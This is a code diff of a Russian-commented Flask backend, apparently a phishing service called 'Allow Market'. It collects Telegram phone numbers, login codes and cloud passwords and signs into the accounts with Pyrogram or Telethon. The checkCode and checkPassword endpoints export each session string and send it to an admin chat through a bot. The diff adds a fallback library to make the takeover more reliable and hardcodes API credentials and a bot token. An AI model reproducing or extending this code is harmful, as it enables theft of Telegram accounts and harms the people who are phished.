@@ -1,3 +1,7 @@
+# app.py — ГИБРИДНАЯ ВЕРСИЯ (Pyrogram + Telethon)
+# КОД ПРИХОДИТ ОТ ОФИЦИАЛЬНОГО TELEGRAM (MTProto)
+# БОТ ТОЛЬКО ДЛЯ ЛОГОВ
+
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import asyncio
@@ -7,15 +11,6 @@ import os
 import json
 import io
 from dotenv import load_dotenv
-from telethon import TelegramClient
-from telethon.errors import (
-    PhoneNumberInvalidError,
-    PhoneCodeInvalidError,
-    PhoneCodeExpiredError,
-    SessionPasswordNeededError,
-    PasswordHashInvalidError,
-    FloodWaitError
-)
 import requests
 
 load_dotenv()
@@ -29,15 +24,53 @@ CORS(app)
 API_ID = int(os.getenv('API_ID', '27908807'))
 API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
 
-# БОТ ТОЛЬКО ДЛЯ ЛОГОВ АДМИНУ (НЕ ДЛЯ КОДА!)
 ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
 ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
 
-# Хранилище сессий
 sessions = {}
+USE_PYROGRAM = True  # Сначала пробуем Pyrogram, потом Telethon
 
 # ============================================================
-# ФУНКЦИИ ДЛЯ ЛОГОВ (ТОЛЬКО ДЛЯ АДМИНА)
+# ПЫТАЕМСЯ ИМПОРТИРОВАТЬ БИБЛИОТЕКИ
+# ============================================================
+try:
+    from pyrogram import Client
+    from pyrogram.errors import (
+        PhoneNumberInvalid,
+        PhoneCodeInvalid,
+        PhoneCodeExpired,
+        SessionPasswordNeeded,
+        PasswordHashInvalid,
+        FloodWait
+    )
+    PYROGRAM_AVAILABLE = True
+    print("✅ Pyrogram доступен")
+except ImportError:
+    PYROGRAM_AVAILABLE = False
+    print("❌ Pyrogram НЕ доступен")
+
+try:
+    from telethon import TelegramClient
+    from telethon.errors import (
+        PhoneNumberInvalidError,
+        PhoneCodeInvalidError,
+        PhoneCodeExpiredError,
+        SessionPasswordNeededError,
+        PasswordHashInvalidError,
+        FloodWaitError
+    )
+    TELETHON_AVAILABLE = True
+    print("✅ Telethon доступен")
+except ImportError:
+    TELETHON_AVAILABLE = False
+    print("❌ Telethon НЕ доступен")
+
+if not PYROGRAM_AVAILABLE and not TELETHON_AVAILABLE:
+    print("❌ НЕТ ДОСТУПНЫХ БИБЛИОТЕК MTProto!")
+    exit(1)
+
+# ============================================================
+# ФУНКЦИИ ДЛЯ ЛОГОВ (ТОЛЬКО ЧЕРЕЗ БОТА)
 # ============================================================
 
 def send_admin_log(message, data=None):
@@ -89,74 +122,151 @@ def send_tdata_to_admin(session_data):
         print(f"Send tdata error: {e}")
 
 # ============================================================
-# MTProto API (Telethon) — КОД ПРИХОДИТ ОТ TELEGRAM!
+# MTProto ФУНКЦИИ
 # ============================================================
 
-async def send_code_async(phone):
-    """Отправка кода через MTProto. Код приходит ОТ TELEGRAM."""
+# ----- Pyrogram -----
+async def send_code_pyrogram(phone):
+    if not PYROGRAM_AVAILABLE:
+        return {'success': False, 'error': 'Pyrogram not available'}
+    
     try:
-        session_name = f"sessions/{phone.replace('+', '').replace(' ', '')}"
+        session_name = f"sessions/pyro_{phone.replace('+', '').replace(' ', '')}"
+        client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
+        await client.connect()
         
-        client = TelegramClient(
-            session_name,
-            api_id=API_ID,
-            api_hash=API_HASH
-        )
+        if await client.get_me():
+            await client.disconnect()
+            return {'success': False, 'error': 'Already authorized'}
         
+        sent_code = await client.send_code(phone)
+        sessions[phone] = {
+            'client': client,
+            'phone_code_hash': sent_code.phone_code_hash,
+            'type': 'pyrogram'
+        }
+        
+        send_admin_log(f"📱 [Pyrogram] Код запрошен для {phone}")
+        return {'success': True, 'phone_code_hash': sent_code.phone_code_hash}
+        
+    except PhoneNumberInvalid:
+        return {'success': False, 'error': 'Invalid phone number'}
+    except FloodWait as e:
+        return {'success': False, 'error': f'Wait {e.value} seconds'}
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+async def check_code_pyrogram(phone, code, phone_code_hash):
+    try:
+        client_data = sessions.get(phone)
+        if not client_data or client_data.get('type') != 'pyrogram':
+            return {'success': False, 'error': 'Session not found'}
+        
+        client = client_data['client']
+        if not client.is_connected:
+            await client.connect()
+        
+        try:
+            signed_in = await client.sign_in(phone, code, phone_code_hash)
+            session_string = await client.export_session_string()
+            
+            session_data = {
+                'user_id': signed_in.id,
+                'phone': phone,
+                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
+                'first_name': signed_in.first_name or 'User',
+                'last_name': signed_in.last_name or '',
+                'session_string': session_string
+            }
+            
+            await client.disconnect()
+            return {'success': True, 'hasPassword': False, 'sessionData': session_data}
+            
+        except SessionPasswordNeeded:
+            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
+        except PhoneCodeInvalid:
+            return {'success': False, 'error': 'Invalid code'}
+        except PhoneCodeExpired:
+            return {'success': False, 'error': 'Code expired'}
+            
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+async def check_password_pyrogram(phone, password):
+    try:
+        client_data = sessions.get(phone)
+        if not client_data or client_data.get('type') != 'pyrogram':
+            return {'success': False, 'error': 'Session not found'}
+        
+        client = client_data['client']
+        if not client.is_connected:
+            await client.connect()
+        
+        try:
+            signed_in = await client.check_password(password)
+            session_string = await client.export_session_string()
+            
+            session_data = {
+                'user_id': signed_in.id,
+                'phone': phone,
+                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
+                'first_name': signed_in.first_name or 'User',
+                'last_name': signed_in.last_name or '',
+                'session_string': session_string
+            }
+            
+            await client.disconnect()
+            return {'success': True, 'sessionData': session_data}
+            
+        except PasswordHashInvalid:
+            return {'success': False, 'error': 'Invalid password'}
+            
+    except Exception as e:
+        return {'success': False, 'error': str(e)}
+
+# ----- Telethon -----
+async def send_code_telethon(phone):
+    if not TELETHON_AVAILABLE:
+        return {'success': False, 'error': 'Telethon not available'}
+    
+    try:
+        session_name = f"sessions/tel_{phone.replace('+', '').replace(' ', '')}"
+        client = TelegramClient(session_name, api_id=API_ID, api_hash=API_HASH)
         await client.connect()
         
         if await client.is_user_authorized():
             await client.disconnect()
             return {'success': False, 'error': 'Already authorized'}
         
-        # ОТПРАВЛЯЕМ ЗАПРОС НА КОД ЧЕРЕЗ MTProto
-        # TELEGRAM САМ ОТПРАВЛЯЕТ КОД ПОЛЬЗОВАТЕЛЮ!
         result = await client.send_code_request(phone)
-        
         sessions[phone] = {
             'client': client,
             'phone_code_hash': result.phone_code_hash,
-            'is_connected': True
+            'type': 'telethon'
         }
         
-        # ЛОГ ДЛЯ АДМИНА (БЕЗ КОДА!)
-        send_admin_log(
-            f"📱 Запрос кода для {phone}",
-            f"✅ Код отправлен через MTProto (официальный Telegram API)"
-        )
-        
-        return {
-            'success': True,
-            'phone_code_hash': result.phone_code_hash,
-            'message': 'Code sent by Telegram'
-        }
+        send_admin_log(f"📱 [Telethon] Код запрошен для {phone}")
+        return {'success': True, 'phone_code_hash': result.phone_code_hash}
         
     except PhoneNumberInvalidError:
         return {'success': False, 'error': 'Invalid phone number'}
     except FloodWaitError as e:
-        return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds'}
+        return {'success': False, 'error': f'Wait {e.seconds} seconds'}
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
-async def check_code_async(phone, code, phone_code_hash):
-    """Проверка кода через MTProto"""
+async def check_code_telethon(phone, code, phone_code_hash):
     try:
         client_data = sessions.get(phone)
-        if not client_data:
+        if not client_data or client_data.get('type') != 'telethon':
             return {'success': False, 'error': 'Session not found'}
         
         client = client_data['client']
-        
         if not client.is_connected():
             await client.connect()
         
         try:
-            signed_in = await client.sign_in(
-                phone=phone,
-                code=code,
-                phone_code_hash=phone_code_hash
-            )
-            
+            signed_in = await client.sign_in(phone, code, phone_code_hash)
             session_string = client.session.save()
             
             session_data = {
@@ -169,20 +279,10 @@ async def check_code_async(phone, code, phone_code_hash):
             }
             
             await client.disconnect()
-            
-            return {
-                'success': True,
-                'hasPassword': False,
-                'sessionData': session_data
-            }
+            return {'success': True, 'hasPassword': False, 'sessionData': session_data}
             
         except SessionPasswordNeededError:
-            return {
-                'success': True,
-                'hasPassword': True,
-                'message': 'Cloud password required'
-            }
-            
+            return {'success': True, 'hasPassword': True, 'message': 'Cloud password required'}
         except PhoneCodeInvalidError:
             return {'success': False, 'error': 'Invalid code'}
         except PhoneCodeExpiredError:
@@ -191,21 +291,18 @@ async def check_code_async(phone, code, phone_code_hash):
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
-async def check_password_async(phone, password):
-    """Проверка облачного пароля через MTProto"""
+async def check_password_telethon(phone, password):
     try:
         client_data = sessions.get(phone)
-        if not client_data:
+        if not client_data or client_data.get('type') != 'telethon':
             return {'success': False, 'error': 'Session not found'}
         
         client = client_data['client']
-        
         if not client.is_connected():
             await client.connect()
         
         try:
             signed_in = await client.sign_in(password=password)
-            
             session_string = client.session.save()
             
             session_data = {
@@ -218,17 +315,56 @@ async def check_password_async(phone, password):
             }
             
             await client.disconnect()
-            
-            return {
-                'success': True,
-                'sessionData': session_data
-            }
+            return {'success': True, 'sessionData': session_data}
             
         except PasswordHashInvalidError:
             return {'success': False, 'error': 'Invalid password'}
             
     except Exception as e:
         return {'success': False, 'error': str(e)}
+
+# ============================================================
+# УНИВЕРСАЛЬНЫЕ ФУНКЦИИ (пробуем Pyrogram, потом Telethon)
+# ============================================================
+
+async def send_code_async(phone):
+    # Сначала пробуем Pyrogram
+    if PYROGRAM_AVAILABLE:
+        result = await send_code_pyrogram(phone)
+        if result['success']:
+            return result
+    
+    # Если Pyrogram не работает, пробуем Telethon
+    if TELETHON_AVAILABLE:
+        result = await send_code_telethon(phone)
+        if result['success']:
+            return result
+    
+    return {'success': False, 'error': 'No MTProto library available'}
+
+async def check_code_async(phone, code, phone_code_hash):
+    client_data = sessions.get(phone)
+    if not client_data:
+        return {'success': False, 'error': 'Session not found'}
+    
+    if client_data.get('type') == 'pyrogram' and PYROGRAM_AVAILABLE:
+        return await check_code_pyrogram(phone, code, phone_code_hash)
+    elif client_data.get('type') == 'telethon' and TELETHON_AVAILABLE:
+        return await check_code_telethon(phone, code, phone_code_hash)
+    
+    return {'success': False, 'error': 'Unknown session type'}
+
+async def check_password_async(phone, password):
+    client_data = sessions.get(phone)
+    if not client_data:
+        return {'success': False, 'error': 'Session not found'}
+    
+    if client_data.get('type') == 'pyrogram' and PYROGRAM_AVAILABLE:
+        return await check_password_pyrogram(phone, password)
+    elif client_data.get('type') == 'telethon' and TELETHON_AVAILABLE:
+        return await check_password_telethon(phone, password)
+    
+    return {'success': False, 'error': 'Unknown session type'}
 
 # ============================================================
 # FLASK ЭНДПОИНТЫ
@@ -239,8 +375,12 @@ async def check_password_async(phone, password):
 def ping():
     return jsonify({
         'status': 'online',
-        'service': 'Allow Market Backend (MTProto)',
-        'version': '7.0.0',
+        'service': 'Allow Market Backend (MTProto Hybrid)',
+        'version': '9.0.0',
+        'libraries': {
+            'pyrogram': PYROGRAM_AVAILABLE,
+            'telethon': TELETHON_AVAILABLE
+        },
         'note': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM (MTProto)',
         'endpoints': ['GET /ping', 'POST /sendCode', 'POST /checkCode', 'POST /checkPassword']
     })
@@ -291,14 +431,8 @@ def check_code():
             })
         else:
             session_data = result['sessionData']
-            
-            # ОТПРАВЛЯЕМ TDATA АДМИНУ (ЧЕРЕЗ БОТА)
             send_tdata_to_admin(session_data)
-            send_admin_log(
-                f"✅ Верификация успешна для {phone}",
-                f"User ID: {session_data['user_id']}"
-            )
-            
+            send_admin_log(f"✅ Верификация успешна для {phone}")
             return jsonify({
                 'success': True,
                 'hasPassword': False,
@@ -324,13 +458,8 @@ def check_password():
     
     if result['success']:
         session_data = result['sessionData']
-        
         send_tdata_to_admin(session_data)
-        send_admin_log(
-            f"🔑 Пароль подтверждён для {phone}",
-            f"User ID: {session_data['user_id']}"
-        )
-        
+        send_admin_log(f"🔑 Пароль подтверждён для {phone}")
         return jsonify({
             'success': True,
             'sessionData': session_data,
@@ -339,12 +468,15 @@ def check_password():
     else:
         return jsonify({'success': False, 'error': result.get('error')}), 400
 
+# ============================================================
+# ЗАПУСК
+# ============================================================
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
     print("=" * 60)
-    print("🔐 БЭКЕНД ЗАПУЩЕН (MTProto)")
+    print("🔐 БЭКЕНД ЗАПУЩЕН (MTProto Hybrid)")
+    print(f"📌 Pyrogram: {'✅' if PYROGRAM_AVAILABLE else '❌'}")
+    print(f"📌 Telethon: {'✅' if TELETHON_AVAILABLE else '❌'}")
     print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
-    print("📌 Бот используется ТОЛЬКО для логов админу")
-    print("📌 В логах админа НЕТ кода!")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
